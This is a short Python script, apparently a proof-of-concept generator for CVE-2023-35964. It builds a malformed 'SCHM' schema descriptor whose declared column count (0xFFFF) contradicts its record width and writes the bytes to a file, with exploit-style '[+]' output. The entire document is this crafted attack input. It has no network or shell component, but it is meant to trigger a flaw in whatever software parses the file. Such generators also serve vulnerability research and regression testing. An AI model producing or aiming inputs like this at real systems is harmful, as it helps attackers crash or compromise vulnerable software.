#!/usr/bin/env python3
"""CVE-2023-35964 — Schema modification. Descriptor whose declared column
count contradicts the record width."""
import struct, sys
from pathlib import Path

def build() -> bytes:
    # [magic][version:u16][cols:u16][rec_len:u32][name_len:u8][name]
    return (b"SCHM" + struct.pack("<HHI", 2, 0xFFFF, 0x40)
            + bytes([4]) + b"user")

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-35964.bin")
    data = build(); out.write_bytes(data)
    print(f"[+] CVE-2023-35964 schema descriptor -> {out} ({len(data)} bytes)")

if __name__ == "__main__":
    main()
